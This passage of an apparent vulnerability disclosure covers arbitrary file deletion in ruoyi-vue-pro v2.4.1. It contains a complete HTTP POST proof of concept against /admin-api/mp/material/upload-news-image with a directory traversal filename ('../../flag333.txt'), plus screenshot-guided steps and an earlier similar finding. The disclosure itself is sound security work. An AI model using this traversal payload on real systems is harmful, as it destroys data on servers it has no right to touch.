![image-20250313090712739](assets/image-20250313090712739.png)

Go to official account management ->auto reply ->add ->picture ->upload picture![image-20250313090741400](assets/image-20250313090741400.png)

Here filename can traverse directories

![image-20250313090840387](assets/image-20250313090840387.png)

You can see the deleted path at the end of this temporary uploaded file

![image-20250313090858424](assets/image-20250313090858424.png)

Successfully deleted file

![image-20250313090916400](assets/image-20250313090916400.png)

## 7、Arbitrary file deletion vulnerability --uploadNewsImage

###  `/admin-api/mp/material/upload-news-image` Arbitrary file deletion

[Affected version]

v2.4.1



[Affected Component]

/admin-api/mp/material/upload-news-image



[Software]

https://gitee.com/zhijiantianya/ruoyi-vue-pro/archive/refs/tags/v2.4.1(jdk17/21).zip



[Description]

There is an arbitrary file deletion vulnerability caused by directory traversal in the material upload interface of ruoyi-vue-pro v2.4.1, as described in the `/admin-api/mp/material/upload-news-image` section. Hackers can exploit this vulnerability to delete files that can be accessed by the programme.

POC

```
POST /admin-api/mp/material/upload-news-image HTTP/1.1
Host: localhost:48080
Content-Length: 389
sec-ch-ua: "Chromium";v="113", "Not-A.Brand";v="24"
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryi1bQzkVotz8Q6DJH
sec-ch-ua-mobile: ?0
Authorization: Bearer e27987519afe4a05806c081f55b74831
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
sec-ch-ua-platform: "Windows"
Accept: */*
Sec-Fetch-Site: same-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Connection: close

------WebKitFormBoundaryi1bQzkVotz8Q6DJH
Content-Disposition: form-data; name="type"

image
------WebKitFormBoundaryi1bQzkVotz8Q6DJH
Content-Disposition: form-data; name="accountId"

6
------WebKitFormBoundaryi1bQzkVotz8Q6DJH
Content-Disposition: form-data; name="file"; filename="../../flag333.txt"
Content-Type: image/jpeg

test3
------WebKitFormBoundaryi1bQzkVotz8Q6DJH--

```

Here we first create a test file called flag333.txt

![image-20250313124630912](assets/image-20250313124630912.png)

First, go to official account Management ->Account Management to add an account. The appId format should be correct, such as: wx1111111111111111

![image-20250313124650873](assets/image-20250313124650873.png)

Then directly construct the data packet of the POC above, filename=../../flag333.txt， Send packets

![image-20250313124703157](assets/image-20250313124703157.png)

You can see that the uploadNewsImage interface here also uses the last del method and does not filter, Causing directory traversal

![image-20250313124734220](assets/image-20250313124734220.png)

File successfully deleted

![image-20250313124801796](assets/image-20250313124801796.png)
